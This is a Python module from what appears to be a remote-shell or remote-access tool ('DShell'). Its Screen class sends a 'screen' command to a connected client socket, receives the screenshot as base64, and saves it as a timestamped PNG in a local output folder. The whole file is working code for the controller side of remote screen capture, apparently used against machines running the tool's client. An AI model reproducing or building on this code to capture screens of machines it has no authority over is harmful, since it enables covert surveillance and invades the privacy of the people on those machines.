#!/usr/bin/python3.7
# -*- coding: utf-8 -*-
# @Author  : Cr4y0n
# @Software: PyCharm
# @Time    : 2021/3/12 16:25

import time
from base64 import b64decode
from lib.dsSocket import *
from lib.dsPrint import *

class Screen():
    def __init__(self, clientSocket):
        self.clientSocket = clientSocket
        self.screens()

    # base64转image
    def base642image(self, base64Data, filename):
        with open(filename, "wb") as f:
            imageData = b64decode(base64Data)
            f.write(imageData)

    def screens(self):
        self.outputPath = r"./output/"
        if not os.path.isdir(self.outputPath):
            os.mkdir(self.outputPath)
        self.outputPath = r"./output/screen/"
        if not os.path.isdir(self.outputPath):
            os.mkdir(self.outputPath)
        self.date = time.strftime("%Y-%m-%d_%H-%M-%S", time.localtime())
        DShellSend(self.clientSocket, "screen")
        base64Date = DShellRecv(self.clientSocket)
        # print(f"{self.outputPath}screen-{self.date}.png")
        self.base642image(base64Date, f"{self.outputPath}screen_{self.date}.png")
        # print(f"{self.outputPath}screen-{self.date}.png")
        successPrint(f"Screen successfully: {self.outputPath}screen_{self.date}.png")